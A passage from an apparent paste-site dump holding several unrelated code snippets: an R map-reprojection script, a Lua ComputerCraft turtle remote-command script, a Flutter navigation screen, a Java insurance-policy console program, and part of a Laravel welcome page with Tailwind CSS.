state_map <- rbind(state_map, 
                   alaska_state, 
                   hawaii_state, 
                   puertorico_state,
                   usvi_state, 
                   noma_state, 
                   guam_state, 
                   amsam_state
                   )

################################################################################
### Adjust the county-level map
################################################################################

### Alaska
alaska_county <- county_map[county_map$STATEFP==""02"",]
alaska_county <- elide(alaska_county, rotate=-50)
alaska_county <- elide(alaska_county, scale=max(apply(bbox(alaska_county), 1, diff)) / 1.8)
alaska_county <- elide(alaska_county, shift=c(-2400000, -2800000))
proj4string(alaska_county) <- proj4string(county_map)

### Hawaii
hawaii_county <- county_map[county_map$STATEFP==""15"",]
hawaii_county <- elide(hawaii_county, rotate=-35)
hawaii_county <- elide(hawaii_county, shift=c(5800000, -1900000))
proj4string(hawaii_county) <- proj4string(county_map)

### Puerto Rico
puertorico_county <- county_map[county_map$STATEFP==""72"",]
puertorico_county <- elide(puertorico_county, rotate=+13)
puertorico_county <- elide(puertorico_county, scale=max(apply(bbox(puertorico_county), 1, diff)) / 0.5)
puertorico_county <- elide(puertorico_county, shift=c(+600000, -2600000))
proj4string(puertorico_county) <- proj4string(county_map)

### US Virgin Islands
usvi_county <- county_map[county_map$STATEFP==""78"",]
usvi_county <- elide(usvi_county, rotate=+13)
usvi_county <- elide(usvi_county, scale=max(apply(bbox(usvi_county), 1, diff)) / 0.25)
usvi_county <- elide(usvi_county, shift=c(+1500000, -2600000))
proj4string(usvi_county) <- proj4string(county_map)

### Guam
guam_county <- county_map[county_map$STATEFP==""66"",]
guam_county <- elide(guam_county, rotate=-65)
guam_county <- elide(guam_county, scale=max(apply(bbox(guam_county), 1, diff)) / 0.15)
guam_county <- elide(guam_county, shift=c(+1200000, -3200000))
proj4string(guam_county) <- proj4string(county_map)

### Northern Mariana Islands
noma_county <- county_map[county_map$STATEFP==""69"",]
noma_county <- elide(noma_county, rotate=-55)
noma_county <- elide(noma_county, scale=max(apply(bbox(noma_county), 1, diff)) / 0.85)
noma_county <- elide(noma_county, shift=c(+300000, -3400000))
proj4string(noma_county) <- proj4string(county_map)

### American Samoa
amsam_county <- county_map[county_map$STATEFP==""60"",]
amsam_county <- elide(amsam_county, rotate=-55)
amsam_county <- elide(amsam_county, scale=max(apply(bbox(amsam_county), 1, diff)) / 0.25)
amsam_county <- elide(amsam_county, shift=c(-2300000, -3400000))
proj4string(amsam_county) <- proj4string(county_map)

### Add the moved states/territories back to the CONUS map
county_map <- county_map[!county_map$STATEFP %in% non_conus_fips,]
county_map <- rbind(county_map, 
                   alaska_county, 
                   hawaii_county, 
                   puertorico_county,
                   usvi_county, 
                   noma_county, 
                   guam_county, 
                   amsam_county
)

################################################################################
### Save maps, reload, and graph to make sure it worked ok
###############################################################################

### Save modified maps to new shapefile
state_map  %>% st_as_sf() %>% write_sf(mod_state_map)
county_map %>% st_as_sf() %>% write_sf(mod_county_map)

### Load our newly created maps
state_map  <- read_sf(mod_state_map)
county_map <- read_sf(mod_county_map)

### Overlay the state/county maps so we can verify that the map looks correct
ggplot() +
  theme_void() +
  geom_sf(data = county_map, size = 0.1) +
  geom_sf(data = state_map,  size = 0.6, fill = NA)"
QbSGDWvG,remote_commands,gur111,Lua,Thursday 12th of June 2025 11:18:42 PM CDT,"-- Function to find and open a modem
local function openModem()
  local sides = {""left"", ""right"", ""top"", ""bottom"", ""front"", ""back""}
  for _, side in ipairs(sides) do
    if peripheral.getType(side) == ""modem"" then
      rednet.open(side)
      return true
    end
  end
  return false
end

if not openModem() then
  print(""No modem found. Please attach a modem to the turtle."")
  return
end

local args = { ... }

if #args < 2 then
  print(""Usage: remote <turtle-id> <command> [...args]"")
  return
end

local turtleId = tonumber(args[1])
local command = table.concat(args, "" "", 2)

if not turtleId then
  print(""Invalid turtle ID."")
  return
end

-- Send the command to the specified turtle
rednet.send(turtleId, command)

-- Wait for a response (optional)
local senderId, message = rednet.receive(5)  -- Wait for up to 5 seconds
if senderId == turtleId then
  print(""Response from turtle "" .. turtleId .. "": "" .. message)
else
  print(""No response from turtle "" .. turtleId .. "". Got from: "" .. senderId)
end

rednet.close()
"
z2cQDfm4,screen.dart,Zuhairy_Harry,Dart,Thursday 12th of June 2025 10:59:19 PM CDT,"import 'package:einventorycomputer/modules/home/screen/location/location.dart';
import 'package:einventorycomputer/services/auth.dart';
import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:einventorycomputer/modules/home/screen/home.dart';
import 'package:einventorycomputer/modules/home/screen/devices/inventory.dart';
import 'package:einventorycomputer/modules/home/screen/settings/settings.dart';
import 'package:einventorycomputer/modules/home/screen/user/account.dart';
import 'package:einventorycomputer/modules/home/screen/devices/add_device.dart';

class ScreenPage extends StatefulWidget {
  @override
  _ScreenPageState createState() => _ScreenPageState();
}

class _ScreenPageState extends State<ScreenPage> with TickerProviderStateMixin {
  final AuthService _auth = AuthService();
  int _selectedIndex = 0;
  String? _username;
  late AnimationController _drawerAnimationController;

  final List<String> _titles = [
    ""Home"",
    ""Inventory"",
    ""Add Device"",
    ""Settings"",
    ""Account"",
    ""Location"",
  ];

  final List<Widget> _pages = [
    HomePage(),
    InventoryPage(),
    AddDevicePage(),
    SettingsPage(),
    AccountPage(),
    LocationPage(),
  ];

  // Define which indices are in the bottom navigation
  final List<int> _bottomNavIndexes = [0, 1, 4, 5];

  @override
  void initState() {
    super.initState();
    _loadUsername();
    _drawerAnimationController = AnimationController(
      duration: const Duration(milliseconds: 300),
      vsync: this,
    );
  }

  @override
  void dispose() {
    _drawerAnimationController.dispose();
    super.dispose();
  }

  Future<void> _loadUsername() async {
    final user = FirebaseAuth.instance.currentUser;
    if (user != null) {
      final doc = await FirebaseFirestore.instance.collection('users').doc(user.uid).get();
      if (doc.exists) {
        setState(() {
          _username = doc.data()?['username'] ?? 'User';
        });
      }
    }
  }

  void _onSelect(int index) {
    if (_selectedIndex != index) {
      setState(() {
        _selectedIndex = index;
      });
    }
    Navigator.pop(context); // Close drawer
  }

  @override
  Widget build(BuildContext context) {
    final isBottomNavPage = _bottomNavIndexes.contains(_selectedIndex);
    final safeCurrentIndex = _bottomNavIndexes.indexWhere((i) => i == _selectedIndex);

    return Scaffold(
      backgroundColor: const Color(0xFFF8F9FA),
      appBar: AppBar(
        title: Text(
          _titles[_selectedIndex],
          style: const TextStyle(
            fontFamily: 'SansRegular',
            color: Color(0xFF212529),
            fontWeight: FontWeight.w600,
            fontSize: 20,
          ),
        ),
        backgroundColor: Colors.transparent,
        elevation: 0,
        iconTheme: const IconThemeData(color: Color(0xFF212529)),
        leading: Builder(
          builder: (context) => IconButton(
            icon: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.white,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.1),
                    blurRadius: 8,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: const Icon(
                Icons.menu_rounded,
                color: Color(0xFF212529),
                size: 20,
              ),
            ),
            onPressed: () => Scaffold.of(context).openDrawer(),
          ),
        ),
      ),
      drawer: Drawer(
        backgroundColor: Colors.white,
        elevation: 0,
        child: SafeArea(
          child: Column(
            children: [
              // Header Section
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(24),
                decoration: const BoxDecoration(
                  color: Color(0xFF212529),
                  borderRadius: BorderRadius.only(
                    bottomLeft: Radius.circular(24),
                    bottomRight: Radius.circular(24),
                  ),
                ),
                child: Column(
                  children: [
                    Container(
                      width: 80,
                      height: 80,
                      decoration: BoxDecoration(
                        color: const Color(0xFFFFC727),
                        borderRadius: BorderRadius.circular(20),
                        boxShadow: [
                          BoxShadow(
                            color: const Color(0xFFFFC727).withOpacity(0.3),
                            blurRadius: 12,
                            offset: const Offset(0, 4),
                          ),
                        ],
                      ),
                      child: const Icon(
                        Icons.person_rounded,
                        size: 40,
                        color: Color(0xFF212529),
                      ),
                    ),
                    const SizedBox(height: 16),
                    Text(
                      _username ?? 'Loading...',
                      style: const TextStyle(
                        fontFamily: 'SansRegular',
                        fontWeight: FontWeight.w600,
                        fontSize: 18,
                        color: Color(0xFFFFC727),
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      FirebaseAuth.instance.currentUser?.email ?? '',
                      style: const TextStyle(
                        fontFamily: 'SansRegular',
                        fontSize: 14,
                        color: Color(0xFFADB5BD),
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                ),
              ),
              
              const SizedBox(height: 24),
              
              // Navigation Items
              Expanded(
                child: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  child: Column(
                    children: [
                      _buildDrawerItem(Icons.home_outlined, Icons.home_rounded, ""Home"", 0),
                      _buildDrawerItem(Icons.inventory_2_outlined, Icons.inventory_2_rounded, ""Inventory"", 1),
                      _buildDrawerItem(Icons.add_box_outlined, Icons.add_box_rounded, ""Add Device"", 2),
                      _buildDrawerItem(Icons.settings_outlined, Icons.settings_rounded, ""Settings"", 3),
                      _buildDrawerItem(Icons.person_outline_rounded, Icons.person_rounded, ""Account"", 4),
                      _buildDrawerItem(Icons.location_city_outlined, Icons.location_city_rounded, ""Location"", 5),
                    ],
                  ),
                ),
              ),
              
              // Logout Section
              Padding(
                padding: const EdgeInsets.all(24),
                child: Container(
                  width: double.infinity,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [Color(0xFF212529), Color(0xFF343A40)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(16),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.1),
                        blurRadius: 12,
                        offset: const Offset(0, 4),
                      ),
                    ],
                  ),
                  child: Material(
                    color: Colors.transparent,
                    child: InkWell(
                      borderRadius: BorderRadius.circular(16),
                      onTap: () async {
                        await _auth.signOut();
                      },
                      child: Padding(
                        padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 20),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                color: const Color(0xFFFFC727).withOpacity(0.2),
                                borderRadius: BorderRadius.circular(8),
                              ),
                              child: const Icon(
                                Icons.logout_rounded,
                                color: Color(0xFFFFC727),
                                size: 20,
                              ),
                            ),
                            const SizedBox(width: 12),
                            const Text(
                              ""Sign Out"",
                              style: TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.w600,
                                color: Color(0xFFFFC727),
                                fontFamily: 'SansRegular',
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
      body: _pages[_selectedIndex],
      bottomNavigationBar: isBottomNavPage
          ? Container(
              margin: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: const Color(0xFF212529),
                borderRadius: BorderRadius.circular(24),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.15),
                    blurRadius: 20,
                    offset: const Offset(0, 8),
                  ),
                ],
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(24),
                child: BottomNavigationBar(
                  currentIndex: safeCurrentIndex,
                  selectedItemColor: const Color(0xFFFFC727),
                  unselectedItemColor: const Color(0xFF6C757D),
                  backgroundColor: const Color(0xFF212529),
                  type: BottomNavigationBarType.fixed,
                  elevation: 0,
                  onTap: (index) {
                    setState(() {
                      _selectedIndex = _bottomNavIndexes[index];
                    });
                  },
                  selectedLabelStyle: const TextStyle(
                    fontFamily: 'SansRegular',
                    fontWeight: FontWeight.w600,
                    fontSize: 12,
                  ),
                  unselectedLabelStyle: const TextStyle(
                    fontFamily: 'SansRegular',
                    fontWeight: FontWeight.w400,
                    fontSize: 12,
                  ),
                  items: [
                    BottomNavigationBarItem(
                      icon: _buildBottomNavIcon(Icons.home_outlined, 0, safeCurrentIndex),
                      activeIcon: _buildBottomNavIcon(Icons.home_rounded, 0, safeCurrentIndex),
                      label: ""Home"",
                    ),
                    BottomNavigationBarItem(
                      icon: _buildBottomNavIcon(Icons.inventory_2_outlined, 1, safeCurrentIndex),
                      activeIcon: _buildBottomNavIcon(Icons.inventory_2_rounded, 1, safeCurrentIndex),
                      label: ""Inventory"",
                    ),
                    BottomNavigationBarItem(
                      icon: _buildBottomNavIcon(Icons.person_outline_rounded, 2, safeCurrentIndex),
                      activeIcon: _buildBottomNavIcon(Icons.person_rounded, 2, safeCurrentIndex),
                      label: ""Account"",
                    ),
                    BottomNavigationBarItem(
                      icon: _buildBottomNavIcon(Icons.location_city_outlined, 3, safeCurrentIndex),
                      activeIcon: _buildBottomNavIcon(Icons.location_city_rounded, 3, safeCurrentIndex),
                      label: ""Location"",
                    ),
                  ],
                ),
              ),
            )
          : null,
    );
  }

  Widget _buildDrawerItem(IconData icon, IconData activeIcon, String title, int index) {
    final isSelected = _selectedIndex == index;

    return Container(
      decoration: BoxDecoration(
        color: isSelected ? const Color(0xFFFFC727).withOpacity(0.1) : Colors.transparent,
        borderRadius: BorderRadius.circular(16),
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          borderRadius: BorderRadius.circular(16),
          onTap: () => _onSelect(index),
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: isSelected 
                        ? const Color(0xFFFFC727) 
                        : const Color(0xFFF8F9FA),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Icon(
                    isSelected ? activeIcon : icon,
                    color: isSelected 
                        ? const Color(0xFF212529) 
                        : const Color(0xFF6C757D),
                    size: 20,
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Text(
                    title,
                    style: TextStyle(
                      color: isSelected 
                          ? const Color(0xFF212529) 
                          : const Color(0xFF6C757D),
                      fontFamily: 'SansRegular',
                      fontWeight: isSelected ? FontWeight.w600 : FontWeight.w400,
                      fontSize: 16,
                    ),
                  ),
                ),
                if (isSelected)
                  Container(
                    width: 6,
                    height: 6,
                    decoration: const BoxDecoration(
                      color: Color(0xFFFFC727),
                      shape: BoxShape.circle,
                    ),
                  ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildBottomNavIcon(IconData icon, int index, int currentIndex) {
    final isSelected = index == currentIndex;
    
    return Container(
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: isSelected 
            ? const Color(0xFFFFC727).withOpacity(0.2) 
            : Colors.transparent,
        borderRadius: BorderRadius.circular(12),
      ),
      child: Icon(
        icon,
        size: 24,
        color: isSelected 
            ? const Color(0xFFFFC727) 
            : const Color(0xFF6C757D),
      ),
    );
  }
}"
tyAJg920,Insurance.java,atlog007,Java,Thursday 12th of June 2025 09:42:06 PM CDT,"import java.util.*;

public class Insurance {

    static Scanner sc = new Scanner(System.in);
    static List<String[]> policies = new ArrayList<>();

    public static void main(String[] args) {
        int choice1 = -1;
        int choice2 = -1;
        while (choice1 != 0) {
            System.out.println(""[1] Policy Listing"");
            choice1 = sc.nextInt();
            sc.nextLine();
            switch (choice1) {
                case 1:
                    choice2 = -1;
                    while (choice2 != 0) {
                        System.out.println(""\n[1] Policy Listing\n[2] View Policy\n[0] Go back to Main menu\n"");
                        choice2 = sc.nextInt();
                        sc.nextLine();
                        switch (choice2) {
                            case 1:
                                System.out.println(""You have selected the policy listing feature."");
                                choice2 = inputPolicies();
                                break;
                            case 2:
                                System.out.println(""You have selected the view all policies feature."");
                                displayPolicies();
                                break;
                            case 0:
                                System.out.println(""Exiting........."");
                                choice2 = 0;
                        }
                    }
            }
        }

//        inputPolicies();
//        displayPolicies();
        sc.close();
    }

    // Function to input all policies
    public static int inputPolicies() {

        System.out.println(""\n--- Insurance Policy Entry ---"");

        String policyType = getPolicyType();
        if (policyType == null) return 0;

        String policyTitle = getPolicyTitle();
        if (policyTitle == null) return 0;

        System.out.print(""Enter Sum Assured: "");
        String sumAssured = sc.nextLine();

        System.out.print(""Enter Premium: "");
        String premium = sc.nextLine();

        System.out.print(""Enter Term (in years): "");
        String term = sc.nextLine();

        String[] policy = {policyType, policyTitle, sumAssured, premium, term};
        policies.add(policy);

        return -1;
    }

    // Function to get valid policy type
    public static String getPolicyType() {
        System.out.println(""Select Policy Type:"");
        System.out.println(""1. Generalinsurance"");
        System.out.println(""2. Healthinsurance"");
        System.out.println(""3. Motorinsurance"");
        System.out.print(""Enter choice (1-3): "");
        int typeChoice = sc.nextInt();
        sc.nextLine(); // consume newline

        switch (typeChoice) {
            case 1:
                return ""Generalinsurance"";
            case 2:
                return ""Healthinsurance"";
            case 3:
                return ""Motorinsurance"";
            default:
                System.out.println(""Invalid policy type choice."");
                return null;
        }
    }

    // Function to get valid policy title
    public static String getPolicyTitle() {
        System.out.println(""Select Policy Title:"");
        System.out.println(""1. BimaGold"");
        System.out.println(""2. Janand"");
        System.out.println(""3. Vridhdhi"");
        System.out.println(""4. Child Career"");
        System.out.println(""5. Floater"");
        System.out.println(""6. Conventional"");
        System.out.print(""Enter choice (1-6): "");
        int titleChoice = sc.nextInt();
        sc.nextLine(); // consume newline

        switch (titleChoice) {
            case 1:
                return ""BimaGold"";
            case 2:
                return ""Janand"";
            case 3:
                return ""Vridhdhi"";
            case 4:
                return ""Child Career"";
            case 5:
                return ""Floater"";
            case 6:
                return ""Conventional"";
            default:
                System.out.println(""Invalid policy title choice."");
                return null;
        }
    }

    // Function to display all entered policies
    public static void displayPolicies() {
        System.out.println(""\n--- All Insurance Policies ---"");
        for (int i = 0; i < policies.size(); i++) {
            String[] p = policies.get(i);
            System.out.println(""Policy "" + (i + 1));
            System.out.println(""Policy Type : "" + p[0]);
            System.out.println(""Policy Title: "" + p[1]);
            System.out.println(""Sum Assured : "" + p[2]);
            System.out.println(""Premium     : "" + p[3]);
            System.out.println(""Term        : "" + p[4] + "" years"");
            System.out.println(""---------------------------"");
        }
    }
}
"
psruyKyj,welcome.blade.php,jinhad,PHP,Thursday 12th of June 2025 09:09:14 PM CDT,"<!DOCTYPE html>
<html lang=""{{ str_replace('_', '-', app()->getLocale()) }}"">

<head>
    <meta charset=""utf-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1"">

    <title>MW | Moraw</title>
    <meta name=""description""
        content=""Aplicação web desenvolvida por J.M.Moraes, utilizando Laravel, Livewire e Tailwind CSS. Solução eficiente para gestão."">
    <meta name=""keywords"" content=""moraw, laravel, livewire, tailwind, aplicação web, desenvolvimento web, Moraes"">
    <meta name=""author"" content=""J.M.Moraes"">

    <!-- Open Graph (Redes Sociais) -->
    <meta property=""og:title"" content=""Moraw | Aplicação Web Moderna"">
    <meta property=""og:description"" content=""Desenvolvida com Laravel e Livewire para para gestão privada."">
    <meta property=""og:type"" content=""website"">
    <meta property=""og:url"" content=""https://moraw.ct.ws"">
    <meta property=""og:image"" content=""https://moraw.ct.ws/uploads/moraw-1600x630-thumbnail.jpg"">
    <meta property=""og:site_name"" content=""Moraw"">
    <link rel=""icon""
        href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='currentColor' viewBox='0 0 440 376'%3E%3Cpath d='M 56.53 6.41 h 152.93 v 366.88 L 70.37 178.11 h 62.28 l 33.07 45.89 V 69.06 H 74.71 l -9.85 13.81 L 87.53 115.2 l -62.43 0.5 L 2 84 z' style='fill:%2399f'/%3E%3Cpath d='M229.93 6.29h152.83l54.2 76.26-72.48 101.38-0.18-87.61 9.85-13.31-9.67-13.81-23.22-0.25-0.35 148.54-43.63 61.17-1.76-206.77H271.3l1.05 239.85-45.03 61.17z' style='fill:%2399f;fill-opacity:.811765'/%3E%3C/svg%3E""
        sizes=""any"" type=""image/svg+xml"">

    <!-- Fonts -->
    <link rel=""preconnect"" href=""https://fonts.bunny.net"">
    <link href=""https://fonts.bunny.net/css?family=instrument-sans:400,500,600"" rel=""stylesheet"" />

    <!-- Styles / Scripts -->
    @if (file_exists(public_path('build/manifest.json')) || file_exists(public_path('hot')))
        @vite(['resources/css/app.css', 'resources/js/app.js'])
    @else
        <style>
            /*! tailwindcss v4.0.7 | MIT License | https://tailwindcss.com */
            @layer theme {

                :root,
                :host {
                    --font-sans: 'Instrument Sans', ui-sans-serif, system-ui, sans-serif, ""Apple Color Emoji"", ""Segoe UI Emoji"", ""Segoe UI Symbol"", ""Noto Color Emoji"";
                    --font-serif: ui-serif, Georgia, Cambria, ""Times New Roman"", Times, serif;
                    --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, ""Liberation Mono"", ""Courier New"", monospace;
                    --color-red-50: oklch(.971 .013 17.38);
                    --color-red-100: oklch(.936 .032 17.717);
                    --color-red-200: oklch(.885 .062 18.334);
                    --color-red-300: oklch(.808 .114 19.571);
                    --color-red-400: oklch(.704 .191 22.216);
                    --color-red-500: oklch(.637 .237 25.331);
                    --color-red-600: oklch(.577 .245 27.325);
                    --color-red-700: oklch(.505 .213 27.518);
                    --color-red-800: oklch(.444 .177 26.899);
                    --color-red-900: oklch(.396 .141 25.723);
                    --color-red-950: oklch(.258 .092 26.042);
                    --color-orange-50: oklch(.98 .016 73.684);
                    --color-orange-100: oklch(.954 .038 75.164);
                    --color-orange-200: oklch(.901 .076 70.697);
                    --color-orange-300: oklch(.837 .128 66.29);
                    --color-orange-400: oklch(.75 .183 55.934);
                    --color-orange-500: oklch(.705 .213 47.604);
                    --color-orange-600: oklch(.646 .222 41.116);
                    --color-orange-700: oklch(.553 .195 38.402);
                    --color-orange-800: oklch(.47 .157 37.304);
                    --color-orange-900: oklch(.408 .123 38.172);
                    --color-orange-950: oklch(.266 .079 36.259);
                    --color-amber-50: oklch(.987 .022 95.277);
                    --color-amber-100: oklch(.962 .059 95.617);
                    --color-amber-200: oklch(.924 .12 95.746);
                    --color-amber-300: oklch(.879 .169 91.605);
                    --color-amber-400: oklch(.828 .189 84.429);
                    --color-amber-500: oklch(.769 .188 70.08);
                    --color-amber-600: oklch(.666 .179 58.318);
                    --color-amber-700: oklch(.555 .163 48.998);
                    --color-amber-800: oklch(.473 .137 46.201);
                    --color-amber-900: oklch(.414 .112 45.904);
                    --color-amber-950: oklch(.279 .077 45.635);
                    --color-yellow-50: oklch(.987 .026 102.212);
                    --color-yellow-100: oklch(.973 .071 103.193);
                    --color-yellow-200: oklch(.945 .129 101.54);
                    --color-yellow-300: oklch(.905 .182 98.111);
                    --color-yellow-400: oklch(.852 .199 91.936);
                    --color-yellow-500: oklch(.795 .184 86.047);
                    --color-yellow-600: oklch(.681 .162 75.834);
                    --color-yellow-700: oklch(.554 .135 66.442);
                    --color-yellow-800: oklch(.476 .114 61.907);
                    --color-yellow-900: oklch(.421 .095 57.708);
                    --color-yellow-950: oklch(.286 .066 53.813);
                    --color-lime-50: oklch(.986 .031 120.757);
                    --color-lime-100: oklch(.967 .067 122.328);
                    --color-lime-200: oklch(.938 .127 124.321);
                    --color-lime-300: oklch(.897 .196 126.665);
                    --color-lime-400: oklch(.841 .238 128.85);
                    --color-lime-500: oklch(.768 .233 130.85);
                    --color-lime-600: oklch(.648 .2 131.684);
                    --color-lime-700: oklch(.532 .157 131.589);
                    --color-lime-800: oklch(.453 .124 130.933);
                    --color-lime-900: oklch(.405 .101 131.063);
                    --color-lime-950: oklch(.274 .072 132.109);
                    --color-green-50: oklch(.982 .018 155.826);
                    --color-green-100: oklch(.962 .044 156.743);
                    --color-green-200: oklch(.925 .084 155.995);
                    --color-green-300: oklch(.871 .15 154.449);
                    --color-green-400: oklch(.792 .209 151.711);
                    --color-green-500: oklch(.723 .219 149.579);
                    --color-green-600: oklch(.627 .194 149.214);
                    --color-green-700: oklch(.527 .154 150.069);
                    --color-green-800: oklch(.448 .119 151.328);
                    --color-green-900: oklch(.393 .095 152.535);
                    --color-green-950: oklch(.266 .065 152.934);
                    --color-emerald-50: oklch(.979 .021 166.113);
                    --color-emerald-100: oklch(.95 .052 163.051);
                    --color-emerald-200: oklch(.905 .093 164.15);
                    --color-emerald-300: oklch(.845 .143 164.978);
                    --color-emerald-400: oklch(.765 .177 163.223);
                    --color-emerald-500: oklch(.696 .17 162.48);
                    --color-emerald-600: oklch(.596 .145 163.225);
                    --color-emerald-700: oklch(.508 .118 165.612);
                    --color-emerald-800: oklch(.432 .095 166.913);
                    --color-emerald-900: oklch(.378 .077 168.94);
                    --color-emerald-950: oklch(.262 .051 172.552);
                    --color-teal-50: oklch(.984 .014 180.72);
                    --color-teal-100: oklch(.953 .051 180.801);
                    --color-teal-200: oklch(.91 .096 180.426);
                    --color-teal-300: oklch(.855 .138 181.071);
                    --color-teal-400: oklch(.777 .152 181.912);
                    --color-teal-500: oklch(.704 .14 182.503);
                    --color-teal-600: oklch(.6 .118 184.704);
                    --color-teal-700: oklch(.511 .096 186.391);
                    --color-teal-800: oklch(.437 .078 188.216);
                    --color-teal-900: oklch(.386 .063 188.416);
                    --color-teal-950: oklch(.277 .046 192.524);
                    --color-cyan-50: oklch(.984 .019 200.873);
                    --color-cyan-100: oklch(.956 .045 203.388);
                    --color-cyan-200: oklch(.917 .08 205.041);
                    --color-cyan-300: oklch(.865 .127 207.078);
                    --color-cyan-400: oklch(.789 .154 211.53);
                    --color-cyan-500: oklch(.715 .143 215.221);
                    --color-cyan-600: oklch(.609 .126 221.723);
                    --color-cyan-700: oklch(.52 .105 223.128);
                    --color-cyan-800: oklch(.45 .085 224.283);
                    --color-cyan-900: oklch(.398 .07 227.392);
                    --color-cyan-950: oklch(.302 .056 229.695);
                    --color-sky-50: oklch(.977 .013 236.62);
                    --color-sky-100: oklch(.951 .026 236.824);
                    --color-sky-200: oklch(.901 .058 230.902);
                    --color-sky-300: oklch(.828 .111 230.318);
                    --color-sky-400: oklch(.746 .16 232.661);
                    --color-sky-500: oklch(.685 .169 237.323);
                    --color-sky-600: oklch(.588 .158 241.966);
                    --color-sky-700: oklch(.5 .134 242.749);
                    --color-sky-800: oklch(.443 .11 240.79);
                    --color-sky-900: oklch(.391 .09 240.876);
                    --color-sky-950: oklch(.293 .066 243.157);
                    --color-blue-50: oklch(.97 .014 254.604);
                    --color-blue-100: oklch(.932 .032 255.585);
                    --color-blue-200: oklch(.882 .059 254.128);
                    --color-blue-300: oklch(.809 .105 251.813);
                    --color-blue-400: oklch(.707 .165 254.624);
                    --color-blue-500: oklch(.623 .214 259.815);
                    --color-blue-600: oklch(.546 .245 262.881);
                    --color-blue-700: oklch(.488 .243 264.376);
                    --color-blue-800: oklch(.424 .199 265.638);
                    --color-blue-900: oklch(.379 .146 265.522);
                    --color-blue-950: oklch(.282 .091 267.935);
                    --color-indigo-50: oklch(.962 .018 272.314);
                    --color-indigo-100: oklch(.93 .034 272.788);
                    --color-indigo-200: oklch(.87 .065 274.039);
                    --color-indigo-300: oklch(.785 .115 274.713);
                    --color-indigo-400: oklch(.673 .182 276.935);
                    --color-indigo-500: oklch(.585 .233 277.117);
                    --color-indigo-600: oklch(.511 .262 276.966);
                    --color-indigo-700: oklch(.457 .24 277.023);
                    --color-indigo-800: oklch(.398 .195 277.366);
                    --color-indigo-900: oklch(.359 .144 278.697);
                    --color-indigo-950: oklch(.257 .09 281.288);
                    --color-violet-50: oklch(.969 .016 293.756);
                    --color-violet-100: oklch(.943 .029 294.588);
                    --color-violet-200: oklch(.894 .057 293.283);
                    --color-violet-300: oklch(.811 .111 293.571);
                    --color-violet-400: oklch(.702 .183 293.541);
                    --color-violet-500: oklch(.606 .25 292.717);
                    --color-violet-600: oklch(.541 .281 293.009);
                    --color-violet-700: oklch(.491 .27 292.581);
                    --color-violet-800: oklch(.432 .232 292.759);
                    --color-violet-900: oklch(.38 .189 293.745);
                    --color-violet-950: oklch(.283 .141 291.089);
                    --color-purple-50: oklch(.977 .014 308.299);
                    --color-purple-100: oklch(.946 .033 307.174);
                    --color-purple-200: oklch(.902 .063 306.703);
                    --color-purple-300: oklch(.827 .119 306.383);
                    --color-purple-400: oklch(.714 .203 305.504);
                    --color-purple-500: oklch(.627 .265 303.9);
                    --color-purple-600: oklch(.558 .288 302.321);
                    --color-purple-700: oklch(.496 .265 301.924);
                    --color-purple-800: oklch(.438 .218 303.724);
                    --color-purple-900: oklch(.381 .176 304.987);
                    --color-purple-950: oklch(.291 .149 302.717);
                    --color-fuchsia-50: oklch(.977 .017 320.058);
                    --color-fuchsia-100: oklch(.952 .037 318.852);
                    --color-fuchsia-200: oklch(.903 .076 319.62);
                    --color-fuchsia-300: oklch(.833 .145 321.434);
                    --color-fuchsia-400: oklch(.74 .238 322.16);
                    --color-fuchsia-500: oklch(.667 .295 322.15);
                    --color-fuchsia-600: oklch(.591 .293 322.896);
                    --color-fuchsia-700: oklch(.518 .253 323.949);
                    --color-fuchsia-800: oklch(.452 .211 324.591);
                    --color-fuchsia-900: oklch(.401 .17 325.612);
                    --color-fuchsia-950: oklch(.293 .136 325.661);
                    --color-pink-50: oklch(.971 .014 343.198);
                    --color-pink-100: oklch(.948 .028 342.258);
                    --color-pink-200: oklch(.899 .061 343.231);
                    --color-pink-300: oklch(.823 .12 346.018);
                    --color-pink-400: oklch(.718 .202 349.761);
                    --color-pink-500: oklch(.656 .241 354.308);
                    --color-pink-600: oklch(.592 .249 .584);
                    --color-pink-700: oklch(.525 .223 3.958);
                    --color-pink-800: oklch(.459 .187 3.815);
                    --color-pink-900: oklch(.408 .153 2.432);
                    --color-pink-950: oklch(.284 .109 3.907);
                    --color-rose-50: oklch(.969 .015 12.422);
                    --color-rose-100: oklch(.941 .03 12.58);
                    --color-rose-200: oklch(.892 .058 10.001);
                    --color-rose-300: oklch(.81 .117 11.638);
                    --color-rose-400: oklch(.712 .194 13.428);
                    --color-rose-500: oklch(.645 .246 16.439);
